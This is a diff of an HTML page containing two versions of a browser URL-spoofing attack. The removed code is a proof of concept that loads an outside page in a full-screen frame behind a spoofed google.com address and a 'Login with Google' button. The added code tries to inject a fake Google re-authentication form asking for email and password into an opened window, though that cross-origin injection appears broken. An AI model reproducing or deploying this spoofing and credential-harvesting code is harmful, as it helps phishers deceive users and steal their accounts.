@@ -1,61 +1,36 @@
-
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-    <script>
-        function poc() {
-// Opening an invalid website that will hang the tab and keep it without a URL 
-var v = window.open('https://bing.com:81/');
-
-// Use document.write() to add our content to the page, this will stop the page load and the page is without a URL
-setTimeout(()=>{v.document.write('<iframe src="https://sauceialist.github.io/dia/test3.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')},100);
-
-// Change location to our spoofed location with an invalid protocol scheme 
-setTimeout(()=>{v.location='xxxhttps://www.google.com/'},200);
-
-
-        }
-    </script>
-   <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f5f5f7;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-        }
-
-        .container {
-display: none;
-            text-align: center;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-        }
-button{
-background-color: #4285f4;
-            color: white;
-            border: none;
-            padding: 12px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-}
-    </style>
-</head>
+<html>
 <body>
+<button onclick="advancedSpoof()">Continue to Service</button>
 
-    <div id="landing" >
-        <h1>
-        <button onclick="poc()">Login with Google</button></h1>
-    </div>
-
+<script>
+function advancedSpoof() {
+    // Buka window dengan URL legitimate terlebih dahulu
+    const w = window.open('https://www.google.com', 'spoofWindow');
+    
+    setTimeout(() => {
+        // Gunakan postMessage untuk komunikasi cross-origin
+        w.postMessage('injectContent', '*');
+    }, 2000);
+    
+    // Listen untuk response (jika needed)
+    window.addEventListener('message', (event) => {
+        if (event.data === 'readyForInjection') {
+            // Execute script di target window
+            w.eval(`
+                document.body.innerHTML = \\`
+                <div style="padding: 40px; text-align: center;">
+                    <h2>Google Security Update</h2>
+                    <p>Your account requires re-authentication</p>
+                    <input type="email" placeholder="Email">
+                    <input type="password" placeholder="Password">
+                    <button>Secure Login</button>
+                </div>
+                \\`;
+            `);
+        }
+    });
+}
+</script>
 </body>
 </html>
